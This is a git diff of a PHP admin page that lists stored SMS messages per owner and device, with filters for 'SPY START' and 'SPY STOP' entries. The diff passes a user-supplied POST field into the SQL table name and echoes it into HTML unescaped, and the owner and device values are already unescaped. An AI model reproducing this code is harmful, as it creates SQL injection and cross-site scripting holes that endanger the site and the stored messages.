@@ -37,6 +37,12 @@
             $signal = $_POST ["signal"] ;
         }
         //echo "SIGNAL = $signal";
+        
+        $smsType = "`ADMIN_SMS`";
+        if(isset($_POST['smsType'])) {
+            $smsType = $_POST ["smsType"] ;
+        }
+        echo "<h3>$smsType</h3>";
     ?>
 
     <?php
@@ -48,15 +54,15 @@
         if(isset($_POST['device_id'])) {
             $device_id = $_POST ["device_id"] ;
         }
-        $sql = "SELECT * FROM `MESSAGE` ORDER BY id DESC";
-        if($signal=='1') $sql = "SELECT * FROM `MESSAGE` WHERE MESSAGE LIKE '%ALERT%' ORDER BY id DESC";
-        if($signal=='2') $sql = "SELECT * FROM `MESSAGE` WHERE MESSAGE LIKE '%SPY START%' ORDER BY id DESC";
-        if($signal=='3') $sql = "SELECT * FROM `MESSAGE` WHERE MESSAGE LIKE '%SPY STOP%' ORDER BY id DESC";
+        $sql = "SELECT * FROM $smsType ORDER BY id DESC";
+        if($signal=='1') $sql = "SELECT * FROM $smsType WHERE MESSAGE LIKE '%ALERT%' ORDER BY id DESC";
+        if($signal=='2') $sql = "SELECT * FROM $smsType WHERE MESSAGE LIKE '%SPY START%' ORDER BY id DESC";
+        if($signal=='3') $sql = "SELECT * FROM $smsType WHERE MESSAGE LIKE '%SPY STOP%' ORDER BY id DESC";
         
         if(!(empty($owner) && empty($device_id))) {
-            $sql = "SELECT * FROM `MESSAGE` where `OWNER`='$owner' and `DEVICE_ID`='$device_id' ORDER BY id DESC";
+            $sql = "SELECT * FROM $smsType where `OWNER`='$owner' and `DEVICE_ID`='$device_id' ORDER BY id DESC";
         } else {
-            $sqlOwner = "SELECT DISTINCT OWNER, DEVICE_ID FROM `MESSAGE` ORDER BY DEVICE_ID DESC";
+            $sqlOwner = "SELECT DISTINCT OWNER, DEVICE_ID FROM $smsType ORDER BY DEVICE_ID DESC";
             $resultOwner = $connection->query($sqlOwner);
         }
         $result = $connection->query($sql);
@@ -81,6 +87,7 @@
                 <input type="hidden" name="signal" id="signal" value="<?php echo $signal ?>">
                 <input type="hidden" name="owner" id="owner" > 
                 <input type="hidden" name="device_id" id="device_id" >
+                <input type="hidden" name="smsType" id="smsType" > 
                 <div style="display: grid; grid-template-columns: 1fr 1fr; grid-gap: 20px;">
                     <div>
                         <select type="select" class="form-control" id="alldevices" required>
@@ -101,6 +108,14 @@
                         <input type="button" value="Alert" onClick="javascript: displayLogs(1)">
                         <input type="button" value="Start" onClick="javascript: displayLogs(2)">
                         <input type="button" value="Stop" onClick="javascript: displayLogs(3)">
+                        <select type="select" id="typesSMS">
+                            <option value="1">`ADMIN_SMS`</ption>
+                            <option value="2">`SUPER_SMS`</ption>
+                            <option value="3">`OWNER_SMS`</ption>
+                            <option value="4">`ALTERNATE_SMS`</ption>
+                            <option value="5">`OTHER_SMS`</ption>
+                            <option value="5">`EXTRA_SMS`</ption>
+                        </select>
                     </div>
                 </div>
             </form>
@@ -133,6 +148,8 @@
                 document.getElementById("device_id").value = myArray[1];
             }
         }
+        var typesSMS = document.getElementById("typesSMS");
+        document.getElementById("smsType").value = typesSMS.options[typesSMS.selectedIndex].text;
         //alert('submitting...');
         loginForm.submit();
     }
